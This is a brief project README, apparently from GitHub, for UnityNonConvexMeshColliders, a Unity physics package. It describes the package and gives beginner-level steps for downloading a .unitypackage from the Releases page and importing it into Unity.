## 📜 Overview
UnityNonConvexMeshColliders offers three types of non-convex MeshCollider approximations designed for use with rigid bodies in Unity. These colliders enhance your game's physics interactions, making complex shapes work seamlessly with Unity's physics engine.

## 🚀 Getting Started
This guide will help you download and run the UnityNonConvexMeshColliders software. You do not need programming knowledge; just follow these steps.

## 📥 Download & Install
To get started, visit the [Releases page](https://github.com/Shinkdon/UnityNonConvexMeshColliders/releases) to download the latest version. 

1. Go to the [Releases page](https://github.com/Shinkdon/UnityNonConvexMeshColliders/releases).
2. Look for the latest version. It usually has the highest version number.
3. Click on the version to view the available files.
4. Download the file that matches your operating system. For most users, this will be the latest `.unitypackage` file.
5. Once downloaded, open Unity and go to: 
   - **Assets > Import Package > Custom Package...**
